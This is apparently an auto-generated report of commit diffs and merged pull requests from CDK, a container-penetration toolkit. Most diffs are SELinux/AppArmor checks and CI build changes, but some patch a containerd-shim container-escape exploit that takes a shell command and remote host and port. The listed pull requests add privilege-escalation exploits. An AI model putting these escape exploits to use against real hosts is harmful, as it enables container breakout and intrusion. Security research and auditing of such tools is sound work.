+		log.Println("SELinux: not detected (no selinuxfs)")
+		return
+	}
+	switch strings.TrimSpace(string(data)) {
+	case "1":
+		log.Println("SELinux: enforcing")
+	case "0":
+		log.Println("SELinux: permissive (loaded but not enforcing)")
+	default:
+		log.Printf("SELinux: unexpected enforce value %q", strings.TrimSpace(string(data)))
+	}
+
+	// Show the container's SELinux label if available.
+	if label, err := ioutil.ReadFile("/proc/self/attr/current"); err == nil {
+		trimmed := strings.TrimRight(string(label), "\x00\n")
+		log.Printf("SELinux: container label: %s", trimmed)
+	}
+}
+
+// CheckAppArmor inspects kernel compile options, boot parameters, runtime
+// status, and the active AppArmor profile for the current process.
+func CheckAppArmor() {
+	// 1. Kernel compile option.
+	if val, ok := readKernelConfigOption("CONFIG_SECURITY_APPARMOR"); ok {
+		log.Printf("AppArmor: kernel config CONFIG_SECURITY_APPARMOR=%s", val)
+	} else {
+		log.Println("AppArmor: kernel config not available")
+	}
+
+	// 2. Boot parameters.
+	if cmdline, err := ioutil.ReadFile("/proc/cmdline"); err == nil {
+		params := string(cmdline)
+		if strings.Contains(params, "apparmor=1") || strings.Contains(params, "security=apparmor") {
+			log.Printf("AppArmor: enabled via boot parameters (%s)", strings.TrimSpace(params))
+		} else if strings.Contains(params, "apparmor=0") {
+			log.Println("AppArmor: disabled via boot parameter apparmor=0")
+		} else {
+			log.Println("AppArmor: no explicit AppArmor boot parameter found")
+		}
+	}
+
+	// 3. Runtime status.
+	if data, err := ioutil.ReadFile("/sys/module/apparmor/parameters/enabled"); err == nil {
+		if strings.TrimSpace(string(data)) == "Y" {
+			log.Println("AppArmor: module is enabled (runtime)")
+		} else {
+			log.Println("AppArmor: module is lo
```

---

### Incident Patch 11: `bf203584` (2025-11-05)
**Commit Message**: fix(eva): rename service discovery file



---

### Incident Patch 12: `ae411af0` (2025-02-22)
**Commit Message**: fix #114 (shim_pwn): a new log for debug, need to fix the bug in future

**File**: `pkg/exploit/escaping/containerd_shim_pwn.go` (modified, +3/-0)
```diff
@@ -124,9 +124,12 @@ func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {
 	localBundlePath := fmt.Sprintf("/cdk_%s", util.RandString(6))
 	os.Mkdir(localBundlePath, os.ModePerm)
 
+	// dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath
 	absPath := GetDockerAbsPath()
 	absPath = strings.TrimSuffix(absPath, "/merged")
 	dockerAbsPath := filepath.Join(absPath, "merged", localBundlePath)
+	// add a new log info, to find bug in real world
+	log.Println("rootfs path, dockerAbsPath:", dockerAbsPath)
 
 	var payloadShellCmd = ""
 	if len(shellCmd) > 0 {
```

---

### Incident Patch 13: `251f18c6` (2024-11-15)
**Commit Message**: fix(gh action - gox): gox not found in path

**File**: `.github/workflows/build_and_release.yml` (modified, +44/-29)
```diff
@@ -34,41 +34,56 @@ jobs:
           set -euo pipefail
           set -x
 
-          go get github.com/mitchellh/gox
-          sudo apt-get install -y upx
+          sudo apt-get update
+          sudo apt-get install -y upx file curl
 
           export CGO_ENABLED=0
-
           export GIT_COMMIT=$(git rev-list -1 HEAD)
-          
-          export ldflags="-X github.com/cdk-team/CDK/pkg/cli.GitCommit=$GIT_COMMIT"
-          gox -parallel 5 -osarch="darwin/amd64 linux/386 linux/amd64 linux/arm linux/arm64" -ldflags="-s -w $ldflags " -output="bin/{{.Dir}}_{{.OS}}_{{.Arch}}" ./cmd/cdk/
-          gox -parallel 5 -osarch="linux/386 linux/amd64 linux/arm64" -ldflags="-s -w $ldflags " -tags="thin" -output="bin/{{.Dir}}_{{.OS}}_{{.Arch}}_thin" ./cmd/cdk/
-
-          # cdk_linux_386 cdk_linux_amd64 cdk_linux_arm cdk_linux_arm64
-          cp bin/cdk_linux_amd64 bin/cdk_linux_amd64_upx
-          upx bin/cdk_linux_amd64_upx
-
-          cp bin/cdk_linux_386 bin/cdk_linux_386_upx
-          upx bin/cdk_linux_386_upx
-
-          cp bin/cdk_linux_amd64_thin bin/cdk_linux_amd64_thin_upx
-          upx bin/cdk_linux_amd64_thin_upx
-
-          cp bin/cdk_linux_386_thin bin/cdk_linux_386_thin_upx
-          upx bin/cdk_linux_386_thin_upx
+          export ldflags="-s -w -extldflags \"-static\" -X github.com/cdk-team/CDK/pkg/cli.GitCommit=$GIT_COMMIT"
+
+          mkdir -p bin
+
+          echo "Building standard versions..."
+          GOOS=darwin GOARCH=amd64 go build -ldflags="$ldflags" -o bin/cdk_darwin_amd64 ./cmd/cdk/ || echo "Darwin build failed"
+          GOOS=linux GOARCH=386 go build -ldflags="$ldflags" -o bin/cdk_linux_386 ./cmd/cdk/
+          GOOS=linux GOARCH=amd64 go build -ldflags="$ldflags" -o bin/cdk_linux_amd64 ./cmd/cdk/
+          GOOS=linux GOARCH=arm go build -ldflags="$ldflags" -o bin/cdk_linux_arm ./cmd/cdk/
+          GOOS=linux GOARCH=arm64 go build -ldflags="$ldflags" -o bin/cdk_linux_arm64 ./cmd/cdk/
+
+          echo "Building thin versions..."
+          GOOS=linux GOARCH=386 go build -ldflags="$ldflags" -tags="thin" -o bin/cdk_linux_386_thin ./cmd/cdk/
+          GOOS=linux GOARCH=amd64 go build -ldflags="$ldflags" -tags="thin" -o bin/cdk_linux_amd64_thin ./cmd/cdk/
+          GOOS=linux GOARCH=arm64 go build -ldflags="$ldflags" -tags="thin" -o bin/cdk_linux_arm64_thin ./cmd/cdk/
+
+          echo "Creating UPX compressed versions..."
+          for file in bin/cdk_linux_{386,amd64}{,_thin}; do
+            if [ -f "$file" ]; then
+              cp "$file" "${file}_upx"
+              upx "${file}_upx" || echo "UPX compression failed for ${file}"
+            fi
+          done
 
           UPLOAD_URL=$(echo -n $UPLOAD_URL | sed s/\{.*//g)
 
-          for FILE in bin/*
-          do
-              echo "Uploading ${FILE}";
-              curl \
-              -H "${API_HEADER}" \
-              -H "${AUTH_HEADER}" \
-              -H "Content-Type: $(file -b --mime-type ${FILE})" \
-              --data-binary "@${FILE}" \
-              "${UPLOAD_URL}?name=$(basename ${FILE})";
+          echo "Uploading files..."
+
+          for FILE in bin/*; do
+            if [ -f "$FILE" ]; then
+              echo "Uploading ${FILE}"
+              MIME_TYPE=$(file -b --mime-type "${FILE}")
+              RESPONSE=$(curl -w "%{http_code}" \
+                -H "${API_HEADER}" \
+                -H "${AUTH_HEADER}" \
+                -H "Content-Type: ${MIME_TYPE}" \
+                --data-binary "@${FILE}" \
+                "${UPLOAD_URL}?name=$(basename ${FILE})" \
+                -o /dev/null)
+              
+              if [ "$RESPONSE" -ne 201 ]; then
+                echo "Error uploading ${FILE}, status code: ${RESPONSE}"
+              fi
+            fi
           done
 
           bash ".github/workflows/changelog.sh"
+
```

---

### Incident Patch 14: `adbae2f9` (2024-11-15)
**Commit Message**: fix(gh action - release): automatically failed because it uses a deprecated version

**File**: `.github/workflows/build_and_release.yml` (modified, +5/-3)
```diff
@@ -1,8 +1,9 @@
 name: CDK CI
 
 on:
+  workflow_dispatch:
   release:
-      types: [released]
+      types: [released, prereleased]
 
 jobs:
 
@@ -13,15 +14,15 @@ jobs:
     steps:
       - uses: actions/setup-go@v2
         with:
-          go-version: 1.15
+          go-version: 1.22.2
       - uses: actions/setup-node@v1
         with:
           node-version: 10.x
       - uses: actions/checkout@v2
         with:
           fetch-depth: 0
 
-      - uses: actions/download-artifact@v2
+      - uses: actions/download-artifact@v4
       - name: Upload Release and Renew Changelog
         env:
           UPLOAD_URL: ${{ github.event.release.upload_url }}
@@ -30,6 +31,7 @@ jobs:
           RELEASE_URL: ${{ github.event.release.url }}
 
         run: |
+          set -euo pipefail
           set -x
 
           go get github.com/mitchellh/gox
```

---

### Incident Patch 15: `4e23c859` (2024-11-15)
**Commit Message**: fix (exp shim-pwn): #104 merged directory appears twice in path (#108)

**File**: `pkg/exploit/escaping/containerd_shim_pwn.go` (modified, +4/-1)
```diff
@@ -26,6 +26,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 
@@ -123,7 +124,9 @@ func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {
 	localBundlePath := fmt.Sprintf("/cdk_%s", util.RandString(6))
 	os.Mkdir(localBundlePath, os.ModePerm)
 
-	dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath
+	absPath := GetDockerAbsPath()
+	absPath = strings.TrimSuffix(absPath, "/merged")
+	dockerAbsPath := filepath.Join(absPath, "merged", localBundlePath)
 
 	var payloadShellCmd = ""
 	if len(shellCmd) > 0 {
```

#### Recent Merged Pull Requests:
- **PR #134** (2026-04-30): fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only) (@neargle)
- **PR #132** (2026-04-30): Updating documentation and wiki for exp limitations (@Copilot)
- **PR #131** (2026-04-30): fix: two compile errors in copy-fail CVE-2026-31431 exploit (@Copilot)
- **PR #130** (2026-04-30): feat: add CVE-2026-31431 copy-fail privilege escalation exploit (@Copilot)
- **PR #129** (2026-05-01): fix(exp): improve xfs exploit support (@LioTree)
- **PR #126** (2026-02-23): Add container security isolation checks to evaluate module (@Copilot)
- **PR #125** (2026-02-23): add cgroup2_ebpf_bypass exploit for container escape (@ibranch7)
- **PR #123** (2025-11-05): fix(eva): rename service discovery file (@neargle)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
